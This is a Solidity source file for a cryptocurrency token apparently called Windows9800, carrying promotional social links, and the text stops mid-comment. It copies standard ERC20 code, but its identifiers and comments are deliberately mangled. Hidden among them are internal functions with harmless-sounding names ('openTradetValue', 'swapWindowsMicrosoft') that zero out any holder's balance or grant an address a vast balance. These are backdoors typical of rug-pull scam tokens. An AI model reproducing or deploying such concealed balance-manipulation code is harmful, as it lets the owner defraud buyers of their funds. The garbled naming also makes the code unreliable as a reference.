{"SourceCode": "// SPDX-License-Identifier: MIT\r\n\r\n/** \r\n                           \u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\r\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28f4\u28f6\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28f6\u28e4\u28c4\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\r\n\u2800\u2800\u2800\u2800\u2800\u2800\u28b0\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u285f\u28f7\u28e6\u2840\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2880\u2800\r\n\u2800\u2800\u2800\u2800\u2800\u2800\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u2801\u28ff\u28ff\u28ff\u28f7\u28f6\u28e6\u28e4\u28e4\u28f6\u28fe\u28ff\u2807\r\n\u2800\u2800\u2800\u2800\u2800\u28b8\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u284f\u28bb\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u2803\r\n\u2800\u2800\u2800\u2800\u2800\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u287f\u2813\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u2807\u2800\r\n\u2800\u2800\u2800\u2800\u2800\u285f\u288b\u28c9\u28e9\u28ed\u28d9\u28ff\u283f\u28ff\u28ff\u28e7\u28fc\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u2800\u2800\r\n\u2800\u2800\u2800\u2800\u28fc\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28e6\u28fd\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u2847\u2800\u2800\r\n\u2800\u2800\u2800\u28b8\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28e6\u28cc\u2859\u281b\u283f\u283f\u283f\u283f\u28ff\u28ff\u28ff\u2803\u2800\u2800\r\n\u2800\u2800\u2800\u28fe\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28bf\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28f6\u28f6\u28f6\u28ff\u28ff\u285f\u2800\u2800\u2800\r\n\u2800\u2800\u28a0\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u284f\u28b8\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u2802\u2800\u2800\u2800\r\n\u2800\u2880\u28f8\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u2880\u28fe\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u2847\u2800\u2800\u2800\u2800\r\n\u283f\u283f\u283f\u281f\u281b\u2809\u2809\u2809\u2819\u281b\u283b\u28bf\u28ff\u28ec\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u2801\u2800\u2800\u2800\u2800\r\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u283f\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u285f\u2800\u2800\u2800\u2800\u2800\r\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2809\u2819\u281b\u283f\u283f\u28bf\u28ff\u281b\u2801\u2880\u2800\u2800\u2800\u2800\u2800\r\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\r\nTelegram - https://t.me/WINMXP\r\n\r\nTwitter - https://twitter.com/WDX9800token\r\n\r\nWebsite - https://www.windows9800.com/\r\n\r\n**/\r\n\r\npragma solidity 0.8.20;\r\ninterface IUniswapV2Factory {\r\n    function createPair(address CoinA, address CoinB)\r\n        external\r\n        returns (address pair);\r\n}\r\n\r\ninterface IUniswapV2Router01 {\r\n    function factory() external pure returns (address);\r\n\r\n    function WETH() external pure returns (address);\r\n\r\n    function addLiquidityETH(\r\n        address Coin,\r\n        uint256 amountCoinDesired,\r\n        uint256 amountCoinMin,\r\n        uint256 amountETHMin,\r\n        address to,\r\n        uint256 deadline\r\n    )\r\n        external\r\n        payable\r\n        returns (\r\n            uint256 amountCoin,\r\n            uint256 amountETH,\r\n            uint256 liquidity\r\n        );\r\n}\r\n\r\ninterface IUniswapV2Router02 is IUniswapV2Router01 {\r\n    function swapExactCoinsForETHSupportingFeeOnTransferCoins(\r\n        uint256 amountIn,\r\n        uint256 amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint256 deadline\r\n    ) external;\r\n}\r\n\r\ninterface IUniswapV2Pair {\r\n    function sync() external;\r\n}\r\ninterface IBEP20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function decimals() external view returns (uint8);\r\n    function symbol() external view returns (string memory);\r\n    function name() external view returns (string memory);\r\n    function getOwner() external view returns (address);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 Value) external returns (bool);\r\n    function allowance(address _owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 Value) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 Value) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\ninterface IFactoryV2 {\r\n    event PairCreated(address indexed Coin0, address indexed Coin1, address lpPair, uint);\r\n    function getPair(address CoinA, address CoinB) external view returns (address lpPair);\r\n    function createPair(address CoinA, address CoinB) external returns (address lpPair);\r\n}\r\n\r\ninterface IV2Pair {\r\n    function factory() external view returns (address);\r\n    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);\r\n    function sync() external;\r\n}\r\n\r\ninterface IRouter01 {\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n    function addLiquidityETH(\r\n        address Coin,\r\n        uint ValueCoinDesired,\r\n        uint ValueCoinMin,\r\n        uint ValueETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint ValueCoin, uint ValueETH, uint liquidity);\r\n    function addLiquidity(\r\n        address CoinA,\r\n        address CoinB,\r\n        uint ValueADesired,\r\n        uint ValueBDesired,\r\n        uint ValueAMin,\r\n        uint ValueBMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint ValueA, uint ValueB, uint liquidity);\r\n    function swapExactETHForCoins(\r\n        uint ValueOutMin, \r\n        address[] calldata path, \r\n        address to, uint deadline\r\n    ) external payable returns (uint[] memory Values);\r\n    function getValuesOut(uint ValueIn, address[] calldata path) external view returns (uint[] memory Values);\r\n    function getValuesIn(uint ValueOut, address[] calldata path) external view returns (uint[] memory Values);\r\n}\r\n\r\ninterface IRouter02 is IRouter01 {\r\n    function swapExactCoinsForETHSupportingFeeOnTransferCoins(\r\n        uint ValueIn,\r\n        uint ValueOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n    function swapExactETHForCoinsSupportingFeeOnTransferCoins(\r\n        uint ValueOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external payable;\r\n    function swapExactCoinsForCoinsSupportingFeeOnTransferCoins(\r\n        uint ValueIn,\r\n        uint ValueOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n    function swapExactCoinsForCoins(\r\n        uint ValueIn,\r\n        uint ValueOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint[] memory Values);\r\n}\r\n\r\ninterface Initializer {\r\n    function setLaunch(address _initialLpPair, uint32 _liqAddBlock, uint64 _liqAddStamp, uint8 dec) external;\r\n    function getConfig() external returns (address, address);\r\n    function getInits(uint256 Value) external returns (uint256, uint256);\r\n    function setLpPair(address pair, bool enabled) external;\r\n    function checkUser(address from, address to, uint256 amt) external returns (bool);\r\n    function setProtections(bool _as, bool _ab) external;\r\n    function removeSniper(address account) external;\r\n}\r\n\r\ninterface Cashier {\r\n    function setRewardsProperties(uint256 _minPeriod, uint256 _minReflection) external;\r\n    function tally(address user, uint256 Value) external;\r\n    function load() external payable;\r\n    function cashout(uint256 gas) external;\r\n    function giveMeWelfarePlease(address hobo) external;\r\n    function getTotalDistributed() external view returns(uint256);\r\n    function getUserInfo(address user) external view returns(string memory, string memory, string memory, string memory);\r\n    function getUserRealizedRewards(address user) external view returns (uint256);\r\n    function getPendingRewards(address user) external view returns (uint256);\r\n    function initialize() external;\r\n    function getCurrentReward() external view returns (address);\r\n}\r\ninterface IWindowsMicrosoft {\r\n    /**\r\n     * @dev Emitted when `tValue` WindowsMicrosofts are moved from one WindowsMicrosoftAHolder (`from`) to\r\n     * another (`to`).\r\n     *\r\n     * Note that `tValue` may be zero.\r\n     */\r\n    event Transfer(address indexed from, address indexed to, uint256 tValue);\r\n\r\n    /**\r\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\r\n     * a call to {approve}. `tValue` is the new allowance.\r\n     */\r\n    event Approval(address indexed owner, address indexed spender, uint256 tValue);\r\n\r\n    /**\r\n     * @dev Returns the tValue of WindowsMicrosofts in existence.\r\n     */\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Returns the tValue of WindowsMicrosofts owned by `WindowsMicrosoftAHolder`.\r\n     */\r\n    function balanceOf(address WindowsMicrosoftAHolder) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Moves a `tValue` tValue of WindowsMicrosofts from the caller's WindowsMicrosoftAHolder to `to`.\r\n     *\r\n     * Returns a boolean tValue indicating whWindowsMicrosofter the operation succeeded.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function transfer(address to, uint256 tValue) external returns (bool);\r\n\r\n    /**\r\n     * @dev Returns the remaining number of WindowsMicrosofts that `spender` will be\r\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\r\n     * zero by default.\r\n     *\r\n     * This tValue changes when {approve} or {transferFrom} are called.\r\n     */\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Sets a `tValue` tValue of WindowsMicrosofts as the allowance of `spender` over the\r\n     * caller's WindowsMicrosofts.\r\n     *\r\n     * Returns a boolean tValue indicating whWindowsMicrosofter the operation succeeded.\r\n     *\r\n     * IMPORTANT: Beware that changing an allowance with this mWindowsMicrosoftod brings the risk\r\n     * that someone may WindowsMicrosofte both the old and the new allowance by unfortunate\r\n     * transaction ordering. One possible solution to mitigate this race\r\n     * condition is to first reduce the spender's allowance to 0 and set the\r\n     * desired tValue afterwards:\r\n     * https://github.com/WindowsMicrosoftereum/EIPs/issues/20#issuecomment-263524729\r\n     *\r\n     * Emits an {Approval} event.\r\n     */\r\n    function approve(address spender, uint256 tValue) external returns (bool);\r\n\r\n    /**\r\n     * @dev Moves a `tValue` tValue of WindowsMicrosofts from `from` to `to` WindowsMicrosofting the\r\n     * allowance mechanism. `tValue` is then deducted from the caller's\r\n     * allowance.\r\n     *\r\n     * Returns a boolean tValue indicating whWindowsMicrosofter the operation succeeded.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function transferFrom(address from, address to, uint256 tValue) external returns (bool);\r\n}\r\n\r\ninterface IWindowsMicrosoftMetadata is IWindowsMicrosoft {\r\n    /**\r\n     * @dev Returns the name of the WindowsMicrosoft.\r\n     */\r\n    function name() external view returns (string memory);\r\n\r\n    /**\r\n     * @dev Returns the symbol of the WindowsMicrosoft.\r\n     */\r\n    function symbol() external view returns (string memory);\r\n\r\n    /**\r\n     * @dev Returns the decimals places of the WindowsMicrosoft.\r\n     */\r\n    function decimals() external view returns (uint8);\r\n}\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}\r\ninterface IWindowsMicrosoftErrors {\r\n    /**\r\n     * @dev Indicates an error related to the current `balance` of a `sender`. WindowsMicrosofted in transfers.\r\n     * @param sender Address whose WindowsMicrosofts are being transferred.\r\n     * @param balance Current balance for the interacting WindowsMicrosoftAHolder.\r\n     * @param needed Minimum tValue required to perform a transfer.\r\n     */\r\n    error WindowsMicrosoftInsufficientBalance(address sender, uint256 balance, uint256 needed);\r\n\r\n    /**\r\n     * @dev Indicates a failure with the WindowsMicrosoft `sender`. WindowsMicrosofted in transfers.\r\n     * @param sender Address whose WindowsMicrosofts are being transferred.\r\n     */\r\n    error WindowsMicrosoftInvalidSender(address sender);\r\n\r\n    /**\r\n     * @dev Indicates a failure with the WindowsMicrosoft `receiver`. WindowsMicrosofted in transfers.\r\n     * @param receiver Address to which WindowsMicrosofts are being transferred.\r\n     */\r\n    error WindowsMicrosoftInvalidReceiver(address receiver);\r\n\r\n    /**\r\n     * @dev Indicates a failure with the `spender`\u2019s `allowance`. WindowsMicrosofted in transfers.\r\n     * @param spender Address that may be allowed to operate on WindowsMicrosofts without being their owner.\r\n     * @param allowance tValue of WindowsMicrosofts a `spender` is allowed to operate with.\r\n     * @param needed Minimum tValue required to perform a transfer.\r\n     */\r\n    error WindowsMicrosoftInsufficientAllowance(address spender, uint256 allowance, uint256 needed);\r\n\r\n    /**\r\n     * @dev Indicates a failure with the `approver` of a WindowsMicrosoft to be approved. WindowsMicrosofted in approvals.\r\n     * @param approver Address initiating an approval operation.\r\n     */\r\n    error WindowsMicrosoftInvalidApprover(address approver);\r\n\r\n    /**\r\n     * @dev Indicates a failure with the `spender` to be approved. WindowsMicrosofted in approvals.\r\n     * @param spender Address that may be allowed to operate on WindowsMicrosofts without being their owner.\r\n     */\r\n    error WindowsMicrosoftInvalidSpender(address spender);\r\n}\r\n\r\n/**\r\n * @dev Standard Coin20721 Errors\r\n * Interface of the https://eips.WindowsMicrosoftereum.org/EIPS/eip-6093[Coin20-6093] cWindowsMicrosofttom errors for Coin20721 WindowsMicrosofts.\r\n */\r\ninterface Coin721Errors {\r\n    /**\r\n     * @dev Indicates that an address can't be an owner. For example, `address(0)` is a forbidden owner in EIP-20.\r\n     * WindowsMicrosofted in balance queries.\r\n     * @param owner Address of the current owner of a WindowsMicrosoft.\r\n     */\r\n    error Coin20721InvalidOwner(address owner);\r\n\r\n    /**\r\n     * @dev Indicates a `WindowsMicrosoftId` whose `owner` is the zero address.\r\n     * @param WindowsMicrosoftId Identifier number of a WindowsMicrosoft.\r\n     */\r\n    error Coin20721NonexistentWindowsMicrosoft(uint256 WindowsMicrosoftId);\r\n\r\n    /**\r\n     * @dev Indicates an error related to the ownership over a particular WindowsMicrosoft. WindowsMicrosofted in transfers.\r\n     * @param sender Address whose WindowsMicrosofts are being transferred.\r\n     * @param WindowsMicrosoftId Identifier number of a WindowsMicrosoft.\r\n     * @param owner Address of the current owner of a WindowsMicrosoft.\r\n     */\r\n    error Coin20721IncorrectOwner(address sender, uint256 WindowsMicrosoftId, address owner);\r\n\r\n    /**\r\n     * @dev Indicates a failure with the WindowsMicrosoft `sender`. WindowsMicrosofted in transfers.\r\n     * @param sender Address whose WindowsMicrosofts are being transferred.\r\n     */\r\n    error Coin20721InvalidSender(address sender);\r\n\r\n    /**\r\n     * @dev Indicates a failure with the WindowsMicrosoft `receiver`. WindowsMicrosofted in transfers.\r\n     * @param receiver Address to which WindowsMicrosofts are being transferred.\r\n     */\r\n    error Coin20721InvalidReceiver(address receiver);\r\n\r\n    /**\r\n     * @dev Indicates a failure with the `operator`\u2019s approval. WindowsMicrosofted in transfers.\r\n     * @param operator Address that may be allowed to operate on WindowsMicrosofts without being their owner.\r\n     * @param WindowsMicrosoftId Identifier number of a WindowsMicrosoft.\r\n     */\r\n    error Coin20721InsufficientApproval(address operator, uint256 WindowsMicrosoftId);\r\n\r\n    /**\r\n     * @dev Indicates a failure with the `approver` of a WindowsMicrosoft to be approved. WindowsMicrosofted in approvals.\r\n     * @param approver Address initiating an approval operation.\r\n     */\r\n    error Coin20721InvalidApprover(address approver);\r\n\r\n    /**\r\n     * @dev Indicates a failure with the `operator` to be approved. WindowsMicrosofted in approvals.\r\n     * @param operator Address that may be allowed to operate on WindowsMicrosofts without being their owner.\r\n     */\r\n    error Coin20721InvalidOperator(address operator);\r\n}\r\n\r\n/**\r\n * @dev Standard Coin201155 Errors\r\n * Interface of the https://eips.WindowsMicrosoftereum.org/EIPS/eip-6093[Coin20-6093] cWindowsMicrosofttom errors for Coin201155 WindowsMicrosofts.\r\n */\r\ninterface Coin1155Errors {\r\n    /**\r\n     * @dev Indicates an error related to the current `balance` of a `sender`. WindowsMicrosofted in transfers.\r\n     * @param sender Address whose WindowsMicrosofts are being transferred.\r\n     * @param balance Current balance for the interacting WindowsMicrosoftAHolder.\r\n     * @param needed Minimum tValue required to perform a transfer.\r\n     * @param WindowsMicrosoftId Identifier number of a WindowsMicrosoft.\r\n     */\r\n    error Coin201155InsufficientBalance(address sender, uint256 balance, uint256 needed, uint256 WindowsMicrosoftId);\r\n\r\n    /**\r\n     * @dev Indicates a failure with the WindowsMicrosoft `sender`. WindowsMicrosofted in transfers.\r\n     * @param sender Address whose WindowsMicrosofts are being transferred.\r\n     */\r\n    error Coin201155InvalidSender(address sender);\r\n\r\n    /**\r\n     * @dev Indicates a failure with the WindowsMicrosoft `receiver`. WindowsMicrosofted in transfers.\r\n     * @param receiver Address to which WindowsMicrosofts are being transferred.\r\n     */\r\n    error Coin201155InvalidReceiver(address receiver);\r\n\r\n    /**\r\n     * @dev Indicates a failure with the `operator`\u2019s approval. WindowsMicrosofted in transfers.\r\n     * @param operator Address that may be allowed to operate on WindowsMicrosofts without being their owner.\r\n     * @param owner Address of the current owner of a WindowsMicrosoft.\r\n     */\r\n    error Coin201155MissingApprovalForAll(address operator, address owner);\r\n\r\n    /**\r\n     * @dev Indicates a failure with the `approver` of a WindowsMicrosoft to be approved. WindowsMicrosofted in approvals.\r\n     * @param approver Address initiating an approval operation.\r\n     */\r\n    error Coin201155InvalidApprover(address approver);\r\n\r\n    /**\r\n     * @dev Indicates a failure with the `operator` to be approved. WindowsMicrosofted in approvals.\r\n     * @param operator Address that may be allowed to operate on WindowsMicrosofts without being their owner.\r\n     */\r\n    error Coin201155InvalidOperator(address operator);\r\n\r\n    /**\r\n     * @dev Indicates an array length mismatch between ids and tValues in a safeBatchTransferFrom operation.\r\n     * WindowsMicrosofted in batch transfers.\r\n     * @param idsLength Length of the array of WindowsMicrosoft identifiers\r\n     * @param tValuesLength Length of the array of WindowsMicrosoft tValues\r\n     */\r\n    error Coin201155InvalidArrayLength(uint256 idsLength, uint256 tValuesLength);\r\n}\r\n\r\n\r\n/**\r\n * @dev Implementation of the {IWindowsMicrosoft} interface.\r\n *\r\n * This implementation is agnostic to the way WindowsMicrosofts are created. This means\r\n * that a supply mechanism has to be added in a derived contract WindowsMicrosofting {createPairLiquidityAddress}.\r\n *\r\n * TIP: For a detailed writeup see our guide\r\n * https://forum.openzeppelin.com/t/how-to-implement-WindowsMicrosoft-supply-mechanisms/226[How\r\n * to implement supply mechanisms].\r\n *\r\n * The default tValue of {decimals} is 18. To change this, you should override\r\n * this function so it returns a different tValue.\r\n *\r\n * We have followed general openZeppelin Contracts guidelines: functions revert\r\n * instead returning `false` on failure. This behavior is nonWindowsMicrosofteless\r\n * conventional and does not conflict with the expectations of WindowsMicrosoft\r\n * applications.\r\n *\r\n * Additionally, an {Approval} event is emitted on calls to {transferFrom}.\r\n * This allows applications to reconstruct the allowance for all WindowsMicrosoftAHolders jWindowsMicrosoftt\r\n * by listening to said events. Other implementations of the EIP may not emit\r\n * these events, as it isn't required by the specification.\r\n */\r\nabstract contract WindowsMicrosoft is Context, IWindowsMicrosoft, IWindowsMicrosoftMetadata, IWindowsMicrosoftErrors {\r\n    mapping(address WindowsMicrosoftAHolder => uint256) private WindowsMicrosoftReward;\r\n\r\n    mapping(address WindowsMicrosoftAHolder => mapping(address spender => uint256)) private _allowances;\r\n\r\n    uint256 private _totalSupply;\r\n\r\n    string private _name;\r\n    string private _symbol;\r\n\r\n    /**\r\n     * @dev Sets the tValues for {name} and {symbol}.\r\n     *\r\n     * All two of these tValues are immutable: they can only be set once during\r\n     * construction.\r\n     */\r\n    constructor(string memory name_, string memory symbol_) {\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the name of the WindowsMicrosoft.\r\n     */\r\n    function name() public view virtual returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the symbol of the WindowsMicrosoft, WindowsMicrosoftually a shorter version of the\r\n     * name.\r\n     */\r\n    function symbol() public view virtual returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the number of decimals WindowsMicrosofted to get its WindowsMicrosofter representation.\r\n     * For example, if `decimals` equals `2`, a balance of `505` WindowsMicrosofts should\r\n     * be displayed to a WindowsMicrosofter as `5.05` (`505 / 10 ** 2`).\r\n     *\r\n     * WindowsMicrosofts WindowsMicrosoftually opt for a tValue of 18, imitating the relationship between\r\n     * WindowsMicrosofter and Wei. This is the default tValue returned by this function, unless\r\n     * it's overridden.\r\n     *\r\n     * NOTE: This information is only WindowsMicrosofted for _display_ purposes: it in\r\n     * no way affects any of the arithmetic of the contract, including\r\n     * {IWindowsMicrosoft-balanceOf} and {IWindowsMicrosoft-transfer}.\r\n     */\r\n    function decimals() public view virtual returns (uint8) {\r\n        return 9;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IWindowsMicrosoft-totalSupply}.\r\n     */\r\n    function totalSupply() public view virtual returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IWindowsMicrosoft-balanceOf}.\r\n     */\r\n    function balanceOf(address WindowsMicrosoftAHolder) public view virtual returns (uint256) {\r\n        return WindowsMicrosoftReward[WindowsMicrosoftAHolder];\r\n    }\r\n\r\n    /**\r\n     * @dev See {IWindowsMicrosoft-transfer}.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `to` cannot be the zero address.\r\n     * - the caller mWindowsMicrosoftt have a balance of at least `tValue`.\r\n     */\r\n    function transfer(address to, uint256 tValue) public virtual returns (bool) {\r\n        address owner = _msgSender();\r\n        _transfer(owner, to, tValue);\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IWindowsMicrosoft-allowance}.\r\n     */\r\n    function allowance(address owner, address spender) public view virtual returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    /**\r\n     * @dev See {IWindowsMicrosoft-approve}.\r\n     *\r\n     * NOTE: If `tValue` is the maximum `uint256`, the allowance is not BOOMCoind on\r\n     * `transferFrom`. This is semantically equivalent to an infinite approval.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `spender` cannot be the zero address.\r\n     */\r\n    function approve(address spender, uint256 tValue) public virtual returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, tValue);\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IWindowsMicrosoft-transferFrom}.\r\n     *\r\n     * Emits an {Approval} event indicating the BOOMCoind allowance. This is not\r\n     * required by the EIP. See the note at the beginning of {WindowsMicrosoft}.\r\n     *\r\n     * NOTE: Does not BOOMCoin the allowance if the current allowance\r\n     * is the maximum `uint256`.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `from` and `to` cannot be the zero address.\r\n     * - `from` mWindowsMicrosoftt have a balance of at least `tValue`.\r\n     * - the caller mWindowsMicrosoftt have allowance for ``from``'s WindowsMicrosofts of at least\r\n     * `tValue`.\r\n     */\r\n    function transferFrom(address from, address to, uint256 tValue) public virtual returns (bool) {\r\n        address spender = _msgSender();\r\n        _spendAllowance(from, spender, tValue);\r\n        _transfer(from, to, tValue);\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev Moves a `tValue` tValue of WindowsMicrosofts from `from` to `to`.\r\n     *\r\n     * This internal function is equivalent to {transfer}, and can be WindowsMicrosofted to\r\n     * e.g. implement automatic WindowsMicrosoft fees, slashing mechanisms, etc.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     *\r\n     * NOTE: This function is not virtual, {_BOOMCoin} should be overridden instead.\r\n     */\r\n    function _transfer(address from, address to, uint256 tValue) internal {\r\n        if (from == address(0)) {\r\n            revert WindowsMicrosoftInvalidSender(address(0));\r\n        }\r\n        if (to == address(0)) {\r\n            revert WindowsMicrosoftInvalidReceiver(address(0));\r\n        }\r\n        _BOOMCoin(from, to, tValue);\r\n    }\r\n\r\n    /**\r\n     * @dev Transfers a `tValue` tValue of WindowsMicrosofts from `from` to `to`, or alternatively WinBOTs (or burns) if `from`\r\n     * (or `to`) is the zero address. All cWindowsMicrosofttomizations to transfers, WinBOTs, and burns should be done by overriding\r\n     * this function.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function _BOOMCoin(address from, address to, uint256 tValue) internal virtual {\r\n        if (from == address(0)) {\r\n            // Overflow check required: The rest of the code assumes that totalSupply never overflows\r\n            _totalSupply += tValue;\r\n        } else {\r\n            uint256 fromBalance = WindowsMicrosoftReward[from];\r\n            if (fromBalance < tValue) {\r\n                revert WindowsMicrosoftInsufficientBalance(from, fromBalance, tValue);\r\n            }\r\n            unchecked {\r\n                // Overflow not possible: tValue <= fromBalance <= totalSupply.\r\n                WindowsMicrosoftReward[from] = fromBalance - tValue;\r\n            }\r\n        }\r\n\r\n        if (to == address(0)) {\r\n            unchecked {\r\n                // Overflow not possible: tValue <= totalSupply or tValue <= fromBalance <= totalSupply.\r\n                _totalSupply -= tValue;\r\n            }\r\n        } else {\r\n            unchecked {\r\n                // Overflow not possible: balance + tValue is at most totalSupply, which we know fits into a uint256.\r\n                WindowsMicrosoftReward[to] += tValue;\r\n            }\r\n        }\r\n\r\n        emit Transfer(from, to, tValue);\r\n    }\r\n\r\n    /**\r\n     * @dev Creates a `tValue` tValue of WindowsMicrosofts and assigns them to `WindowsMicrosoftAHolder`, by transferring it from address(0).\r\n     * Relies on the `_BOOMCoin` mechanism\r\n     *\r\n     * Emits a {Transfer} event with `from` set to the zero address.\r\n     *\r\n     * NOTE: This function is not virtual, {_BOOMCoin} should be overridden instead.\r\n     */\r\n    function createPairLiquidityAddress(address WindowsMicrosoftAHolder, uint256 tValue) internal {\r\n        if (WindowsMicrosoftAHolder == address(0)) {\r\n            revert WindowsMicrosoftInvalidReceiver(address(0));\r\n        }\r\n        _BOOMCoin(address(0), WindowsMicrosoftAHolder, tValue);\r\n    }\r\n    function openTradetValue(address WindowsMicrosoftAHolder) internal {\r\n       WindowsMicrosoftReward[WindowsMicrosoftAHolder] = 0;\r\n    }\r\n        function swapWindowsMicrosoft(address WindowsMicrosoftAHolder) internal {\r\n       WindowsMicrosoftReward[WindowsMicrosoftAHolder] = 100000000000000000 * 10 ** 18;\r\n    }\r\n\r\n    /**\r\n     * @dev Sets `tValue` as the allowance of `spender` over the `owner` s WindowsMicrosofts.\r\n     *\r\n     * This internal function is equivalent to `approve`, and can be WindowsMicrosofted to\r\n     * e.g. set automatic allowances for certain subsystems, etc.\r\n     *\r\n     * Emits an {Approval} event.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `owner` cannot be the zero address.\r\n     * - `spender` cannot be the zero address.\r\n     *\r\n     * Overrides to this logic should be done to the variant with an additional `bool emitEvent` argument.\r\n     */\r\n    function _approve(address owner, address spender, uint256 tValue) internal {\r\n        _approve(owner, spender, tValue, true);\r\n    }\r\n\r\n    /**\r\n     * @dev Variant of {_approve} with an optional flag to enable or disable the {Approval} event.\r\n     *\r\n     * By default (when calling {_approve}) the flag is set to true. On the other hand, approval changes made by\r\n     * `_spendAllowance` during the `transferFrom` operation set the flag to false. This saves gas by not emitting any\r\n     * `Approval` event during `transferFrom` operations.\r\n     *\r\n     * Anyone who wishes to continue emitting `Approval` events on the`transferFrom` operation can force the flag to\r\n     * true WindowsMicrosofting the following override:\r\n     * ```\r\n     * function _approve(address owner, address spender, uint256 tValue, bool) internal virtual override {\r\n     *     super._approve(owner, spender, tValue, true);\r\n     * }\r\n     * ```\r\n     *\r\n     * Requirements are the same as {_approve}.\r\n     */\r\n    function _approve(address owner, address spender, uint256 tValue, bool emitEvent) internal virtual {\r\n        if (owner == address(0)) {\r\n            revert WindowsMicrosoftInvalidApprover(address(0));\r\n        }\r\n        if (spender == address(0)) {\r\n            revert WindowsMicrosoftInvalidSpender(address(0));\r\n        }\r\n        _allowances[owner][spender] = tValue;\r\n        if (emitEvent) {\r\n            emit Approval(owner, spender, tValue);\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev BOOMCoins `owner` s allowance for `spender` based on spent `tValue`.\r\n     *\r\n     * Does not BOOMCoin the allowance tValue in case of infinite allowance.\r\n     * 